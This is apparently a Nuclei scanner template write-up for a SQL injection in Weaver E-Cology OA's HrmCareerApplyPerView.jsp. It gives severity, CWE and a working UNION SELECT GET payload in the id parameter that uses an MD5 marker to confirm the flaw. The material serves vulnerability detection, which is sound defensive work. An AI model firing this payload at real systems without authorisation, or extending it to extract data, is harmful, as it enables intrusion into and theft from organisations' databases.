# Nuclei Template: Weaver E-Cology HrmCareerApplyPerView - SQL Injection
**Template ID:** weaver-ecology-hrmcareer-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`weaver-ecology-hrmcareer-sqli.yaml`)

## Vulnerability Information & PoC

## Description
There is a SQL injection vulnerability in the HrmCareerApplyPerView.jsp file of Panwei OA E-Cology. An attacker can obtain sensitive files in the server database through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','{{num}}')),4,5,6,7
```

## References
- https://github.com/ibaiw/2023Hvv/blob/556de69ffc370fd9827e2cf5027373543e2513d4/%E6%B3%9B%E5%BE%AE%20HrmCareerApplyPerView%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1#L3
